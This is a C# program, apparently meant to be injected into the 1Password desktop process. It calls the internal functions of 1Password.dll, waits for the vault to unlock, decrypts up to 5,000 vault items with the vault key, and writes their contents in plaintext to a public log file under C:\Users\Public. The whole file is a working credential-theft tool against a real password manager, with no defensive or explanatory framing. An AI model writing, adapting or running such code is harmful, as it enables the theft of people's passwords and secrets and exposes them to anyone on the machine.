using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.Reflection;

namespace _1PasswordExtract
{
    class Program
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpFunction);

        internal class ItemData
        {
            public string CategoryUuid;
            public string ChangerUuid;
            public string Details;
            public string Overview;
            public string RejectionReason;
            public string Scope;
            public string ItemUuid;
            public long ItemId;
            public long CreatedAt;
            public long IsFavorite;
            public long LocalEditCount;
            public long? RejectedBuildVersion;
            public long Archived;
            public long UpdatedAt;
            public long VaultId;
            public long Version;

            public string ToJson()
            {
                FieldInfo[] fields = typeof(ItemData).GetFields();
                string ret = "{";
                for (int i = 0; i < fields.Length; i++)
                {
                    object val = fields[i].GetValue(this);
                    if (val != null)
                    {
                        if (fields[i].FieldType == typeof(string))
                            ret += $"'{fields[i].Name}': '{val.ToString()}'";
                        else
                            ret += $"'{fields[i].Name}': {val.ToString()}";
                        if (i != fields.Length - 1)
                            ret += ", ";
                    }
                }
                ret += "}";
                return ret;
            }
            public override string ToString() { return ToJson(); }
        }

        struct ExportItem
        {
            public long ItemId;
            public long VaultId;
            public long AccountId;
        }





        public delegate void GET_ITEM_DATA(long item_id, AcceptClrItemRow accept);
        internal delegate void AcceptClrItemRow(long item_id, [MarshalAs(UnmanagedType.LPWStr)] string category_uuid, [MarshalAs(UnmanagedType.LPWStr)] string changer_uuid, long created_at, [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 5)] byte[] details, IntPtr detailsLen, byte is_favorite, int local_edit_count, [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 9)] byte[] overview, IntPtr overviewLen, int rejected_build_version, [MarshalAs(UnmanagedType.LPWStr)] string rejection_reason, int archived, long updated_at, [MarshalAs(UnmanagedType.LPWStr)] string item_uuid, long vault_id, long version);
        public delegate byte IS_UNLOCKED();
        public delegate void DECRYPT_WITH_VAULT_KEY(long vault_id, byte[] data, IntPtr data_len, AcceptBytes accept);
        internal delegate void AcceptBytes([MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 1)] byte[] b, int len);
        static string logFile = @"C:\Users\Public\1Password.log";


        static void log(string arg)
        {
            File.AppendAllText(logFile, $"{arg}\n");
        }


        static void Main(string[] args)
        {
            IntPtr h1Password = GetModuleHandle("1Password.dll");
            if (h1Password != IntPtr.Zero)
            {
                IntPtr pis_unlocked = GetProcAddress(h1Password, "is_unlocked");
                IntPtr pget_item_data = GetProcAddress(h1Password, "get_item_data");
                IntPtr pdecrypt_with_vault_key = GetProcAddress(h1Password, "decrypt_with_vault_key");

                IS_UNLOCKED is_unlocked = null;
                GET_ITEM_DATA get_item_data = null;
                DECRYPT_WITH_VAULT_KEY decrypt_with_vault_key = null;

                if (pis_unlocked != IntPtr.Zero)
                    is_unlocked = (IS_UNLOCKED)Marshal.GetDelegateForFunctionPointer(pis_unlocked, typeof(IS_UNLOCKED));
                if (pget_item_data != null)
                    get_item_data = (GET_ITEM_DATA)Marshal.GetDelegateForFunctionPointer(pget_item_data, typeof(GET_ITEM_DATA));
                if (pdecrypt_with_vault_key != null)
                    decrypt_with_vault_key = (DECRYPT_WITH_VAULT_KEY)Marshal.GetDelegateForFunctionPointer(pdecrypt_with_vault_key, typeof(DECRYPT_WITH_VAULT_KEY));

                while (is_unlocked() != 1)
                    System.Threading.Thread.Sleep(1000);
                List<ItemData> items = new List<ItemData>();
                for (long i = 0; i < 5000; i++)
                {
                    try
                    {
                        get_item_data(i, delegate (long item_id, string category_uuid, string changer_uuid, long created_at, byte[] details, IntPtr detailsLen, byte is_favorite, int local_edit_count, byte[] overview, IntPtr overviewLen, int rejected_build_version, string rejection_reason, int archived, long updated_at, string item_uuid, long vault_id, long version)
                        {
                            ItemData item = new ItemData()
                            {
                                ItemId = item_id,
                                CategoryUuid = category_uuid,
                                ChangerUuid = changer_uuid,
                                CreatedAt = created_at,
                                Details = System.Text.Encoding.UTF8.GetString(details),
                                IsFavorite = is_favorite,
                                LocalEditCount = local_edit_count,
                                Overview = System.Text.Encoding.UTF8.GetString(overview),
                                RejectedBuildVersion = rejected_build_version,
                                RejectionReason = rejection_reason,
                                Archived = archived,
                                UpdatedAt = updated_at,
                                ItemUuid = item_uuid,
                                VaultId = vault_id,
                                Version = version
                            };
                            if (overview != null)
                            {
                                byte[] decOverview = null;
                                decrypt_with_vault_key(vault_id, overview, (IntPtr)overview.Length, delegate (byte[] b, int l)
                                {
                                    decOverview = (byte[])b.Clone();
                                });
                                if (decOverview != null)
                                    item.Overview = Encoding.UTF8.GetString(decOverview);
                            }
                            if (details != null)
                            {
                                byte[] decdetails = null;
                                decrypt_with_vault_key(vault_id, details, (IntPtr)details.Length, delegate (byte[] b, int l)
                                {
                                    decdetails = (byte[])b.Clone();
                                });
                                if (decdetails != null)
                                    item.Details = Encoding.UTF8.GetString(decdetails);
                            }
                            items.Add(item);
                        });
                    }
                    catch (Exception ex)
                    {
                        string exception = string.Format(
                            "\nERROR: {0}\nStack Trace: {1}\n",
                            new object[] { ex.Message, ex.StackTrace });
                        log(exception);
                    }
                }
                if (items.Count > 0)
                {
                    List<string> json = new List<string>();
                    foreach (var item in items)
                    {
                        json.Add(item.ToJson());
                    }
                    log("[" + string.Join(", ", json.ToArray()) + "]");
                }
            }
        }
    }
}
